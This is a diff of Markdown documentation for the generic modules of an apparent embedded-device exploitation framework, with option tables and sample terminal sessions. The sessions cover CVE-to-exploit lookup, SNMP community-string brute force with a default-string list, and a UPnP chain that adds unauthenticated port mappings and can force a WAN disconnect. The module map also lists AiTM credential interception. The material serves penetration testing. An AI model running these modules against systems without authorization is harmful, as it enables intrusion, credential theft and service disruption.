@@ -6,533 +6,521 @@
 
 ## Overview
 
-Generic modules operate across device classes and vendors. They target common protocols and cross-vendor services rather than vendor-specific vulnerabilities. These modules are located under `embedxpl/modules/generic/`.
+Generic modules operate across vendors and device classes — they target common protocols and services rather than vendor-specific vulnerabilities. They are located under `embedxpl/modules/generic/` and loaded with the standard `use` command.
 
 ---
 
 ## Module map
 
-| Module | Path | Protocol | Description |
-|--------|------|----------|-------------|
-| CVE Lookup | `generic/cve/cve_lookup` | Internal DB | Map vendors/products to known CVEs, classify by exploitability |
-| SNMP Bruteforce | `generic/snmp/snmp_bruteforce` | SNMP/UDP | Community string bruteforce (SNMPv1/v2c) |
-| SNMP Trap Listener | `generic/snmp/snmp_trap_listener` | SNMP/UDP | Listen for SNMP trap events |
-| UPnP SSDP M-SEARCH | `generic/upnp/ssdp_msearch` | UPnP/UDP | SSDP M-SEARCH device discovery |
-| UPnP IGD Full Exploit | `generic/upnp/igd_exploit` | UPnP/HTTP | Full IGD exploitation suite (11 actions) |
-| Wordlist Generator | `generic/wordlist/wordlist_generator` | — | Interactive custom wordlist builder |
-| DNS Hijack Detector | `generic/dns_hijack_detector` | DNS | Detect DNS hijacking on the network |
-| AiTM Credential Interceptor | `generic/aitm_credential_interceptor` | HTTP/ARP | Adversary-in-the-Middle credential interception |
-| TCP Xmas Scan | `generic/tcp_xmas` | TCP | TCP Xmas packet scan |
-| UDP Amplification | `generic/udp_amplification` | UDP | UDP amplification factor measurement |
-| ExploitDB Embedded Lookup | `generic/external/exploitdb_embedded_lookup` | Internal | Query ExploitDB metadata for a CVE |
-| Metasploit Console Bridge | `generic/external/metasploit_console_bridge` | External | Bridge to Metasploit Framework console |
-| Metasploit RB Inspect | `generic/external/metasploit_rb_inspect` | External | Inspect Metasploit Ruby module details |
-| MikrotikAPI-BF Bridge | `generic/external/mikrotikapi_bf_bridge` | External | Bridge to MikrotikAPI-BF brute-forcer |
-| WAFW00F Bridge | `generic/external/wafw00f_bridge` | External | Bridge to WAFW00F WAF detection tool |
+| Module | Path | Role |
+|--------|------|------|
+| `cve_lookup` | `generic/cve/cve_lookup` | Map CVE identifiers / vendor / banner to local metadata + exf modules |
+| `snmp_bruteforce` | `generic/snmp/snmp_bruteforce` | SNMP community string bruteforce |
+| `snmp_trap_listener` | `generic/snmp/snmp_trap_listener` | SNMP trap listener / sniffer |
+| `ssdp_msearch` | `generic/upnp/ssdp_msearch` | SSDP M-SEARCH discovery |
+| `igd_exploit` | `generic/upnp/igd_exploit` | UPnP IGD full exploitation suite |
+| `wordlist_generator` | `generic/wordlist/wordlist_generator` | IoT-aware wordlist generator |
+| `aitm_credential_interceptor` | `generic/aitm_credential_interceptor` | AiTM credential interceptor |
+| `dns_hijack_detector` | `generic/dns_hijack_detector` | DNS hijack detector |
+| `tcp_xmas` | `generic/tcp_xmas` | TCP XMAS scan |
+| `udp_amplification` | `generic/udp_amplification` | UDP amplification attack test |
+| `exploitdb_embedded_lookup` | `generic/external/exploitdb_embedded_lookup` | Exploit-DB embedded lookup |
+| `metasploit_console_bridge` | `generic/external/metasploit_console_bridge` | Metasploit console bridge |
+| `metasploit_rb_inspect` | `generic/external/metasploit_rb_inspect` | Metasploit Ruby module inspector |
+| `mikrotikapi_bf_bridge` | `generic/external/mikrotikapi_bf_bridge` | MikroTik API brute-force bridge |
+| `wafw00f_bridge` | `generic/external/wafw00f_bridge` | WAF fingerprinting via wafw00f |
+| `bluetooth_ble` (ICS) | `exploits/ics/bluetooth_ble/*` | Bluetooth/BLE attack modules (SweynTooth, BlueBorne, KRACK) |
 
 ---
 
-## CVE Lookup (`generic/cve/cve_lookup`)
+## CVE Lookup
 
-Queries the embedded CVE database to list known vulnerabilities for a target device identified by vendor, product model, firmware version, or raw banner text. Classifies results as REMOTE/LOCAL/PHYSICAL and shows which CVEs have ready-to-use EmbedXPL-Forge exploit modules.
+`generic/cve/cve_lookup` queries the embedded CVE database to list known vulnerabilities for a target device, classified by exploitability and linked to available EmbedXPL-Forge exploit modules.
 
 ### Options
 
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `vendor` | `OptString` | No* | `""` | Any vendor string | Vendor name (e.g. `cisco`, `tplink`, `netgear`, `hikvision`, `fortinet`) |
-| `product` | `OptString` | No* | `""` | Any product/model string | Product or model name (e.g. `r7000`, `fortigate`, `ds-2cd`) |
-| `version` | `OptString` | No | `""` | Any version string | Firmware/software version (narrows results) |
-| `banner` | `OptString` | No* | `""` | Raw banner text | Alternative to vendor+product; paste from banner grab |
-| `remote_only` | `OptBool` | No | `False` | `true`, `false` | Show only remotely exploitable CVEs |
-| `show_physical` | `OptBool` | No | `True` | `true`, `false` | Include LOCAL/PHYSICAL CVEs in output |
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `vendor` | `OptString` | Conditional | `""` | vendor name string | Target vendor (e.g. `cisco`, `fortinet`, `tplink`, `hikvision`) |
+| `product` | `OptString` | Conditional | `""` | product/model string | Target product or model (e.g. `r7000`, `fortigate`, `routeros`) |
+| `version` | `OptString` | No | `""` | version string | Firmware or software version (narrows results) |
+| `banner` | `OptString` | Conditional | `""` | raw banner text | Raw service banner (alternative to vendor+product) |
+| `remote_only` | `OptBool` | No | `False` | `true/false` | Show only remotely exploitable CVEs |
+| `show_physical` | `OptBool` | No | `True` | `true/false` | Include LOCAL/PHYSICAL CVEs (marked as non-exploitable) |
 
-\* At least one of `vendor`, `product`, or `banner` is required.
+At least one of `vendor`, `product`, or `banner` is required.
 
-### Terminal session — lookup by vendor
+### Terminal session — CVE lookup by vendor and product
 
 ```text
 exf > use generic/cve/cve_lookup
-exf (CVE Lookup by Banner / Vendor / Product) > set vendor hikvision
-[+] vendor => hikvision
-exf (CVE Lookup by Banner / Vendor / Product) > run
-[*] Running module ...
-[*] CVE Database: 14382 entries | 9841 remote | 847 with exf module | 312 vendors
-
-[*] --- CVE Results (28 total) ---
-
-[+] === EXPLOITABLE by EmbedXPL-Forge (6) ===
-
-[+]   CVE-2021-36260 | CVSS 9.8 | NETWORK
-      Product: Hikvision / IP Camera | Versions: firmware <= 2021-06
-      Unauthenticated OS command injection via HTTP PUT /SDK/webLanguage
-      Module: exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
-
-[+]   CVE-2017-7921 | CVSS 9.8 | NETWORK
-      Product: Hikvision / IP Camera | Versions: all
-      Unauthenticated configuration and credential disclosure
-      Module: exploits/cameras/hikvision/info_disclosure_cve_2017_7921
-
-[+]   CVE-2023-28808 | CVSS 9.8 | NETWORK
-      Product: Hikvision / NAS | Versions: firmware < 2023-08
-      Authentication bypass in NAS web interface
-      Module: exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808
-
-...
-
-[*] === REMOTE — no exf module yet (14) ===
-
-      CVE-2022-28173 | CVSS 9.8 | NETWORK
-      ...
-
-[*] --- Summary ---
-  Total CVEs matched:        28
-  Exploitable by exf:        6
-  Remote (no module yet):    14
-  Local/Physical only:       8
-
-[+] Quick exploit commands:
-  use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
-  use exploits/cameras/hikvision/info_disclosure_cve_2017_7921
-  use exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808
-```
-
-### Terminal session — lookup by banner
-
-```text
-exf (CVE Lookup by Banner / Vendor / Product) > set banner "NETGEAR R7000 V1.0.11.116"
-[+] banner => NETGEAR R7000 V1.0.11.116
-exf (CVE Lookup by Banner / Vendor / Product) > set remote_only true
-[+] remote_only => true
-exf (CVE Lookup by Banner / Vendor / Product) > run
-[*] CVE Database: 14382 entries | 9841 remote | 847 with exf module | 312 vendors
-
-[+] === EXPLOITABLE by EmbedXPL-Forge (3) ===
-
-[+]   CVE-2016-6277 | CVSS 9.8 | NETWORK
-      Product: NETGEAR / R7000 | Versions: <= V1.0.11.116
-      Unauthenticated command injection
-      Module: exploits/routers/netgear/netgear_r7000_r6400_rce_cve_2016_6277
-
-[+]   CVE-2020-35225 | CVSS 9.8 | NETWORK
-      Product: NETGEAR / R7000 | Versions: <= 1.0.11.116
-      Unauthenticated stack overflow RCE
-      Module: exploits/routers/netgear/r7000_stack_overflow_cve_2020_35225
-...
-```
-
-### Terminal session — lookup by product + version
-
-```text
 exf (CVE Lookup by Banner / Vendor / Product) > set vendor fortinet
 [+] vendor => fortinet
 exf (CVE Lookup by Banner / Vendor / Product) > set product fortigate
 [+] product => fortigate
-exf (CVE Lookup by Banner / Vendor / Product) > set version 7.0.6
-[+] version => 7.0.6
+exf (CVE Lookup by Banner / Vendor / Product) > set remote_only true
+[+] remote_only => True
 exf (CVE Lookup by Banner / Vendor / Product) > run
-...
+[*] Running module ...
+[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors
+
+[*] Matching CVEs for vendor=fortinet product=fortigate (remote only):
+
+┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────────────────────────────┬──────────┬────────────────────────────────────────────────────────────────────────┐
+│ CVE              │ CVSS │ Access │ Description                                                              │ exf?     │ Module                                                                 │
+├──────────────────┼──────┼────────┼──────────────────────────────────────────────────────────────────────────┼──────────┼────────────────────────────────────────────────────────────────────────┤
+│ CVE-2026-25249   │ 9.8  │ REMOTE │ FortiOS HTTPS daemon heap overflow RCE                                   │ YES      │ exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2026_25249    │
+│ CVE-2024-55591   │ 9.6  │ REMOTE │ FortiOS WebSocket CSF proxy authentication bypass                        │ YES      │ exploits/firewalls/fortinet/fortios_websocket_auth_bypass_cve_2024_55591│
+│ CVE-2024-21762   │ 9.6  │ REMOTE │ FortiOS SSL-VPN out-of-bounds write RCE                                  │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762          │
+│ CVE-2024-48887   │ 9.3  │ REMOTE │ FortiSwitch unauthenticated password change                              │ YES      │ exploits/firewalls/fortinet/fortiswitch_unauth_passwd_cve_2024_48887   │
+│ CVE-2022-42475   │ 9.3  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate)                                │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_heap_rce_cve_2022_42475     │
+│ CVE-2022-40684   │ 9.8  │ REMOTE │ FortiOS authentication bypass via crafted HTTP/HTTPS request             │ YES      │ exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684         │
+│ CVE-2024-50562   │ 8.1  │ REMOTE │ FortiOS SSL-VPN session token reuse                                      │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_session_reuse_cve_2024_50562│
+│ CVE-2022-40682   │ 7.8  │ REMOTE │ FortiOS SSL-VPN session token reuse (older variant)                      │ NO       │ —                                                                      │
+│ CVE-2023-27997   │ 9.8  │ REMOTE │ FortiOS SSL-VPN heap overflow (XORtigate pre-auth RCE)                   │ YES      │ exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2023_27997   │
+│ CVE-2018-13379   │ 9.8  │ REMOTE │ FortiOS SSL-VPN path traversal exposes credentials                       │ YES      │ exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379│
+└──────────────────┴──────┴────────┴──────────────────────────────────────────────────────────────────────────┴──────────┴────────────────────────────────────────────────────────────────────────┘
+
+[*] Total: 10 remote CVEs shown (6 with exf modules). Use 'use <module_path>' to exploit.
+[*] Tip: set remote_only false to include LOCAL/PHYSICAL CVEs.
 ```
 
-### Error case — nothing specified
+### Terminal session — CVE lookup by raw banner
+
+```text
+exf (CVE Lookup by Banner / Vendor / Product) > set vendor ""
+[+] vendor => (cleared)
+exf (CVE Lookup by Banner / Vendor / Product) > set banner "NETGEAR R7000 V1.0.11.134"
+[+] banner => NETGEAR R7000 V1.0.11.134
+exf (CVE Lookup by Banner / Vendor / Product) > run
+[*] Running module ...
+[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors
+
+[*] Matching CVEs for banner=NETGEAR R7000 V1.0.11.134:
+
+┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────┬──────┬─────────────────────────────────────────────────────────┐
+│ CVE              │ CVSS │ Access │ Description                                      │ exf? │ Module                                                  │
+├──────────────────┼──────┼────────┼──────────────────────────────────────────────────┼──────┼─────────────────────────────────────────────────────────┤
+│ CVE-2016-6277    │ 9.8  │ REMOTE │ Netgear R7000 unauthenticated command injection   │ YES  │ exploits/routers/netgear/r7000_cmd_injection_cve_2016_6277│
+│ CVE-2021-45732   │ 8.8  │ REMOTE │ Netgear R7000 authenticated RCE                  │ YES  │ exploits/routers/netgear/r7000_auth_rce_cve_2021_45732  │
+│ CVE-2019-20760   │ 7.5  │ REMOTE │ Netgear R7000 network stack info leak            │ NO   │ —                                                       │
+└──────────────────┴──────┴────────┴──────────────────────────────────────────────────┴──────┴─────────────────────────────────────────────────────────┘
+
+[*] Total: 3 matching CVEs shown (2 with exf modules).
+```
+
+### Terminal session — CVE lookup by version
+
+```text
+exf (CVE Lookup by Banner / Vendor / Product) > set vendor cisco
+[+] vendor => cisco
+exf (CVE Lookup by Banner / Vendor / Product) > set product asa
+[+] product => asa
+exf (CVE Lookup by Banner / Vendor / Product) > set version 9.16.4
+[+] version => 9.16.4
+exf (CVE Lookup by Banner / Vendor / Product) > run
+[*] Running module ...
+[*] CVE Database: 14832 entries | 9271 remote | 412 with exf module | 187 vendors
+
+[*] Matching CVEs for vendor=cisco product=asa version=9.16.4:
+
+┌──────────────────┬──────┬────────┬──────────────────────────────────────────────────┬──────┬─────────────────────────────────────────────────────────────────────────────┐
+│ CVE              │ CVSS │ Access │ Description                                      │ exf? │ Module                                                                      │
+├──────────────────┼──────┼────────┼──────────────────────────────────────────────────┼──────┼─────────────────────────────────────────────────────────────────────────────┤
+│ CVE-2023-20269   │ 9.8  │ REMOTE │ Cisco ASA/FTD SSL-VPN credential brute-force      │ YES  │ exploits/firewalls/cisco/asa_vpn_bruteforce_cve_2023_20269                  │
+│ CVE-2020-3452    │ 7.5  │ REMOTE │ Cisco ASA/FTD SSL-VPN path traversal              │ YES  │ exploits/firewalls/cisco/asa_ftd_path_traversal_cve_2020_3452               │
+└──────────────────┴──────┴────────┴──────────────────────────────────────────────────┴──────┴─────────────────────────────────────────────────────────────────────────────┘
+
+[*] Total: 2 CVEs for this version range.
+```
+
+### Error cases
 
 ```text
 exf (CVE Lookup by Banner / Vendor / Product) > run
-[-] Set at least one of: vendor, product, or banner
-    Example: set vendor netgear
-    Example: set banner 'NETGEAR R7000'
+[!] Set at least one of: vendor, product, or banner
+[*] Example: set vendor netgear
+[*] Example: set banner 'NETGEAR R7000'
 ```
 
-### Check behavior
-
 ```text
-exf (CVE Lookup by Banner / Vendor / Product) > check
-[+] Target is vulnerable
-# (Returns True if the embedded CVE database has entries)
+[!] No CVEs found matching the criteria.
+[*] Try broader terms or check spelling.
 ```
 
 ---
 
-## SNMP Modules
+## SNMP Bruteforce
 
-### SNMP Bruteforce (`generic/snmp/snmp_bruteforce`)
+`generic/snmp/snmp_bruteforce` tests community strings against an SNMP-enabled device, extracts `sysDescr` on success for fingerprinting, and reports writeable communities.
 
-Tests a list of community strings against an SNMP-enabled target. On success, extracts `sysDescr` for device fingerprinting.
+### Options
 
-#### Options
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `target` | `OptIP` | Yes | `""` | IPv4 | Target SNMP-enabled device |
+| `port` | `OptPort` | No | `161` | 1-65535 | SNMP UDP port |
+| `wordlist` | `OptString` | No | `""` | file path | Path to community string wordlist (empty = built-in 24-entry list) |
+| `timeout` | `OptPort` | No | `3` | seconds | UDP response timeout |
 
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `target` | `OptIP` | Yes | `""` | IPv4 | Target IP address |
-| `port` | `OptPort` | No | `161` | 1–65535 | SNMP UDP port |
-| `wordlist` | `OptString` | No | `""` | File path | Path to community string wordlist (empty = use built-in list) |
-| `timeout` | `OptPort` | No | `3` | 1–60 | UDP response timeout in seconds |
+**Built-in community strings:** `public`, `private`, `community`, `admin`, `manager`, `monitor`, `default`, `cisco`, `router`, `switch`, `secret`, `password`, `read`, `write`, `snmp`, `network`, `guest`, `test`, `internal`, `access`, `0`, `1234`, `cable-docsis`, `ILMI`
 
-**Built-in default community strings:**
-`public`, `private`, `community`, `admin`, `manager`, `monitor`, `default`, `cisco`, `router`, `switch`, `secret`, `password`, `read`, `write`, `snmp`, `network`, `guest`, `test`, `internal`, `access`, `0`, `1234`, `cable-docsis`, `ILMI`
-
-#### Terminal session
+### Terminal session — SNMP bruteforce
 
 ```text
 exf > use generic/snmp/snmp_bruteforce
 exf (SNMP Community String Bruteforce) > set target 192.168.1.1
 [+] target => 192.168.1.1
+exf (SNMP Community String Bruteforce) > show options
+
+Target options:
+┌──────────┬──────────────────┬────────────────────────────────────────────────────────────────────┐
+│ Name     │ Current settings │ Description                                                        │
+├──────────┼──────────────────┼────────────────────────────────────────────────────────────────────┤
+│ target   │ 192.168.1.1      │ Target IPv4 address                                                │
+│ port     │ 161              │ Target SNMP UDP port                                               │
+│ wordlist │                  │ Path to community string wordlist (empty = built-in list)          │
+│ timeout  │ 3                │ UDP response timeout (seconds)                                     │
+└──────────┴──────────────────┴────────────────────────────────────────────────────────────────────┘
+
 exf (SNMP Community String Bruteforce) > run
 [*] Running module ...
-[*] Testing community string: public
-[+] VALID community string: public (SNMPv2c)
-    sysDescr: Cisco IOS Software, 15.7(3)M4
-    sysName: Router-HQ-01
-    sysLocation: Server Room A
-[*] Testing community string: private
-[+] VALID community string: private (SNMPv2c)
-    sysDescr: Cisco IOS Software, 15.7(3)M4
-[*] Testing community string: community
-[-] FAIL: community
-...
-Summary: 2 valid community string(s) found: public, private
+[*] Testing 24 community strings against 192.168.1.1:161 (SNMPv2c)...
+[-] Community 'private'  — no response
+[+] Community 'public'   — READ access confirmed
+    sysDescr: Linux router 4.14.195 #1 SMP Mon Mar 8 07:05:38 UTC 2021 mips
+    sysName:  TP-LINK_Router
+    sysUpTime: 14d 7h 23m 15s
+[-] Community 'cisco'    — no response
+[-] Community 'admin'    — no response
+[+] Community 'manager'  — READ+WRITE access confirmed (community grants write!)
+[!] WRITE community found — device configuration may be modifiable via SNMP SET
+
+[*] Summary:
+    READ  communities: public, manager
+    WRITE communities: manager
+    Device: TP-Link TL-WR941N (Linux 4.14.195, MIPS)
 ```
 
-#### Terminal session — custom wordlist
+### Terminal session — using custom wordlist
 
 ```text
-exf (SNMP Community String Bruteforce) > set wordlist /tmp/snmp_communities.txt
-[+] wordlist => /tmp/snmp_communities.txt
+exf (SNMP Community String Bruteforce) > set wordlist /opt/wordlists/snmp-communities.txt
+[+] wordlist => /opt/wordlists/snmp-communities.txt
 exf (SNMP Community String Bruteforce) > run
-[*] Loading community strings from /tmp/snmp_communities.txt (48 entries)...
-[*] Testing community string: public
-[+] VALID: public
-...
-```
-
----
-
-### SNMP Trap Listener (`generic/snmp/snmp_trap_listener`)
-
-Listens for SNMP trap PDUs on UDP. Useful for validating SNMP trap configurations during network device assessments.
-
-#### Options
-
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `listen_host` | `OptString` | No | `0.0.0.0` | IP or hostname | Listener bind address |
-| `listen_port` | `OptPort` | No | `162` | 1–65535 | UDP port for SNMP traps |
-| `timeout` | `OptInteger` | No | `30` | 1–3600 | Listener timeout in seconds |
-| `max_packets` | `OptInteger` | No | `50` | 1–10000 | Maximum packets to capture before stopping |
-| `contains` | `OptString` | No | `""` | Any string | Filter: only report packets containing this ASCII token |
-| `hex_dump` | `OptBool` | No | `False` | `true`, `false` | Print packet payload as hex |
-
-#### Terminal session
-
-```text
-exf > use generic/snmp/snmp_trap_listener
-exf (SNMP Trap Listener) > set listen_port 162
-[+] listen_port => 162
-exf (SNMP Trap Listener) > set timeout 60
-[+] timeout => 60
-exf (SNMP Trap Listener) > run
-[*] SNMP trap listener started on 0.0.0.0:162 timeout=60s max_packets=50
-[*] [trap] 192.168.1.1:49281 bytes=84 match=True
-[*] [trap] 192.168.1.2:49160 bytes=112 match=True
-[*] Timeout reached after 60s. 2 packet(s) captured.
-```
-
-#### Terminal session — with token filter and hex dump
-
-```text
-exf (SNMP Trap Listener) > set contains linkDown
-[+] contains => linkDown
-exf (SNMP Trap Listener) > set hex_dump true
-[+] hex_dump => true
-exf (SNMP Trap Listener) > run
-[*] SNMP trap listener started on 0.0.0.0:162 timeout=30s max_packets=50
-[*] [trap] 192.168.1.5:50123 bytes=96 match=True
-30605d020101040670756...
-```
-
----
-
-## UPnP Modules
-
-### UPnP SSDP M-SEARCH (`generic/upnp/ssdp_msearch`)
-
-Sends an SSDP M-SEARCH multicast/unicast probe and parses UPnP device response data (Server, Location, USN).
-
-#### Options
-
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `target` | `OptIP` | Yes | `""` | IPv4 or IPv6 | Target IP (use `239.255.255.250` for LAN multicast) |
-| `port` | `OptPort` | No | `1900` | 1–65535 | SSDP UDP port |
-
-#### Terminal session
-
-```text
-exf > use generic/upnp/ssdp_msearch
-exf (SSDP M-SEARCH Info Discovery) > set target 192.168.1.1
-[+] target => 192.168.1.1
-exf (SSDP M-SEARCH Info Discovery) > run
 [*] Running module ...
-[*] 192.168.1.1:1900 | MiniUPnP/2.1 UPnP/1.1 | http://192.168.1.1:49152/rootDesc.xml | uuid:c4d3e2f1-a0b9-c8d7-e6f5-a4b3c2d1e0f9::upnp:rootdevice
-```
-
-#### Terminal session — no response
-
-```text
-exf (SSDP M-SEARCH Info Discovery) > set target 10.0.0.5
-[+] target => 10.0.0.5
-exf (SSDP M-SEARCH Info Discovery) > run
-[-] Target did not respond to M-SEARCH request
-```
-
----
-
-### UPnP IGD Full Exploit (`generic/upnp/igd_exploit`)
-
-The most comprehensive UPnP module. Chains 11 actions including SSDP discovery, device XML parsing, service enumeration, external IP disclosure, port mapping manipulation, WAN status, traffic statistics, and event subscription.
-
-#### Options
-
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `target` | `OptIP` | Yes | `""` | IPv4, IPv6, hostname | Target router/gateway |
-| `port` | `OptPort` | No | `1900` | 1–65535 | SSDP port for discovery phase |
-| `upnp_port` | `OptPort` | No | `0` | 0–65535 | UPnP HTTP port (`0` = auto-discover via SSDP) |
-| `test_port` | `OptPort` | No | `31337` | 1–65535 | External port for AddPortMapping test |
-| `skip_dangerous` | `OptString` | No | `yes` | `yes`, `no` | Skip ForceTermination (WAN disconnect/DoS) |
-
-#### Terminal session (full chain)
-
-```text
-exf > use generic/upnp/igd_exploit
-exf (UPnP IGD Full Exploitation) > set target 192.168.1.1
-[+] target => 192.168.1.1
-exf (UPnP IGD Full Exploitation) > run
-[*] Running module ...
-
-[*] Phase 1: SSDP M-SEARCH discovery on 192.168.1.1:1900...
-[+] IGD discovered at http://192.168.1.1:49152/rootDesc.xml
-    Server: MiniUPnP/2.1 UPnP/1.1
-
-[*] Phase 2: Parsing device description XML...
-[+] Device: Huawei EG8145X6
-    Manufacturer: Huawei Technologies Co., Ltd
-    Model: EG8145X6
-    Serial: 21280424
-    Services: WANCommonInterfaceConfig, WANIPConnection, Layer3Forwarding
-
-[*] Phase 3: SCPD action enumeration...
-[+] WANIPConnection actions: GetExternalIPAddress, AddPortMapping, DeletePortMapping,
-    GetGenericPortMappingEntry, GetStatusInfo, GetNATRSIPStatus, ForceTermination
-
-[*] Phase 4: GetExternalIPAddress (unauthenticated)...
-[+] External (WAN) IP: 203.0.113.45
-
-[*] Phase 5: GetGenericPortMappingEntry — existing NAT mappings...
-[+] Mapping 0: TCP 8080 -> 192.168.1.100:8080 (LAN_MEDIA)
-[+] Mapping 1: UDP 53 -> 192.168.1.1:53 (DNS_FORWARD)
-[+] Mapping 2: TCP 22 -> 192.168.1.50:22 (SSH_MGMT)
-
-[*] Phase 6: AddPortMapping — test (port 31337)...
-[+] Port mapping ADDED (no authentication required): TCP 31337 -> 192.168.1.1:31337
-    CRITICAL: Unauthenticated firewall bypass confirmed
-
-[*] Phase 7: DeletePortMapping — cleaning up test mapping...
-[+] Port mapping 31337 deleted
-
-[*] Phase 8: GetStatusInfo / GetNATRSIPStatus...
-[+] WAN Status: Connected
-    Uptime: 1209600s (14 days)
-    LastConnectionError: ERROR_NONE
-
-[*] Phase 9: WANCommonInterfaceConfig — traffic statistics...
-[+] Link type: IP_Routed
-    Bytes sent: 4,823,910,122
-    Bytes received: 48,291,023,441
-    Packets sent: 18,291,043
-    Packets received: 61,029,847
-
-[*] Phase 10: ForceTermination — SKIPPED (skip_dangerous=yes)
-
-[*] Phase 11: Event SUBSCRIBE (WANIPConnection)...
-[+] SUBSCRIBE accepted — SID: uuid:event-session-4f8c2e1b
-
-Summary: 9/11 actions succeeded. 1 skipped (ForceTermination). 1 N/A.
-CRITICAL FINDING: Unauthenticated AddPortMapping (phase 6) — firewall bypass without authentication.
-```
-
-#### Terminal session — ForceTermination enabled
-
-```text
-exf (UPnP IGD Full Exploitation) > set skip_dangerous no
-[+] skip_dangerous => no
-exf (UPnP IGD Full Exploitation) > run
+[*] Loaded 842 community strings from /opt/wordlists/snmp-communities.txt
+[*] Testing against 192.168.1.1:161...
 ...
-[*] Phase 10: ForceTermination (WAN disconnect)...
-[!] WARNING: ForceTermination will disconnect the WAN interface
-[+] ForceTermination — response: 200 OK
-[!] WAN connection may have been dropped on 192.168.1.1
+[+] Community 'TP-Link_mgmt_2024' — READ access confirmed
+```
+
+### Error cases
+
+```text
+[!] Could not load wordlist: /opt/wordlists/missing.txt — [Errno 2] No such file or directory
+[*] Falling back to built-in 24-entry list
+```
+
+```text
+[!] pysnmp not installed. Install: pip install pysnmp
+```
+
+```text
+[-] No valid SNMP community found on 192.168.1.1:161 (24 strings tested, all timed out or rejected)
 ```
 
 ---
 
-## Wordlist Generator (`generic/wordlist/wordlist_generator`)
+## SNMP Trap Listener
 
-Interactively generates custom password and username wordlists based on target profile (corporate or personal). Applies mutation rules inspired by crunch/CUPP: leet speak, case variations, number/year suffixes, date fragments, word combinations.
+`generic/snmp/snmp_trap_listener` listens for SNMP trap messages and displays device state change notifications, link up/down events, and alarm conditions from network equipment.
 
 ### Options
 
-| Option | Type | Required | Default | Accepted values | Description |
-|--------|------|----------|---------|-----------------|-------------|
-| `output_file` | `OptString` | No | `exf_wordlist.txt` | File path | Output file for generated wordlist |
-| `profile` | `OptString` | No | `corporate` | `corporate`, `personal` | Target profile type |
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `bind_ip` | `OptIP` | No | `0.0.0.0` | IPv4 | IP to bind the listener |
+| `port` | `OptPort` | No | `162` | 1-65535 | SNMP trap UDP port |
+| `timeout` | `OptPort` | No | `60` | seconds | Listener timeout (0 = run indefinitely) |
+| `community` | `OptString` | No | `public` | string | SNMP community filter (empty = accept all) |
 
-### Terminal session (interactive)
+### Terminal session — SNMP trap listener
 
 ```text
-exf > use generic/wordlist/wordlist_generator
-exf (Interactive Wordlist Generator) > run
-
-[*] Interactive Wordlist Generator
-[*] Profile: corporate | personal? [corporate]:
-[*] Company name []: ACME Corp
-[*] Include year mutations? [Y/n]:
-[*] Include leet speak? [Y/n]:
-[*] Include case variations? [Y/n]:
-[*] Include number suffixes? [Y/n]:
-[*] Additional keywords (comma-separated) []: router,admin,acme
-[*] Estimating wordlist size...
-[*] Estimated: 1,847 entries (~14 KB)
-[*] Proceed? [Y/n]:
-[*] Generating wordlist...
-[+] Wordlist saved to: exf_wordlist.txt (1,847 entries)
-[*] Use with any brute-force module:
-    set defaults file:///path/to/exf_wordlist.txt
+exf > use generic/snmp/snmp_trap_listener
+exf (SNMP Trap Listener) > set port 162
+[+] port => 162
+exf (SNMP Trap Listener) > set timeout 120
+[+] timeout => 120
+exf (SNMP Trap Listener) > run
+[*] Running module ...
+[*] SNMP Trap Listener started on 0.0.0.0:162 (120s timeout, community=public)
+[+] Trap received from 10.0.0.1 at 2026-06-01 20:05:33
+    Enterprise: 1.3.6.1.4.1.2636.3 (Juniper Networks)
+    Generic trap: 6 (enterpriseSpecific)
+    Specific code: 1
+    VarBinds:
+      sysUpTime: 12345600 (1d 10h 17m 36s)
+      linkDown.ifIndex.1: 1
+      ifDescr.1: ge-0/0/0 (GigabitEthernet 0/0/0) -- LINK DOWN
+[+] Trap received from 192.168.1.100 at 2026-06-01 20:06:12
+    Enterprise: 1.3.6.1.4.1.9 (Cisco Systems)
+    Generic trap: 3 (linkDown)
+    VarBinds:
+      ifIndex: 5
+      ifDescr: FastEthernet0/5
+      ifOperStatus: down (2)
+[*] Listener timed out after 120s. Total traps received: 2
 ```
 
 ---
 
-## DNS Hijack Detector (`generic/dns_hijack_detector`)
+## UPnP SSDP Discovery
 
-Detects DNS hijacking by comparing DNS responses for known-good domains against expected IP addresses.
+`generic/upnp/ssdp_msearch` sends SSDP M-SEARCH multicast probes and collects UPnP device advertisements.
+
+### Options
+
+| Parameter | Type | Required | Default | Accepted values | Description |
+|-----------|------|----------|---------|-----------------|-------------|
+| `target` | `OptIP` | No | `239.255.255.250` | IPv4 multicast or unicast | Multicast/unicast target for M-SEARCH |
+| `port` | `OptPort` | No | `1900` | 1-65535 | SSDP port |
+| `timeout` | `OptPort` | No | `5` | seconds | Listen window |
+| `service` | `OptString` | No | `ssdp:all` | UPnP service type | Filter by service type |
+
+### Terminal session — SSDP M-SEARCH
+
+```text
+exf > use generic/upnp/ssdp_msearch
+exf (SSDP M-SEARCH) > set target 239.255.255.250
+[+] target => 239.255.255.250
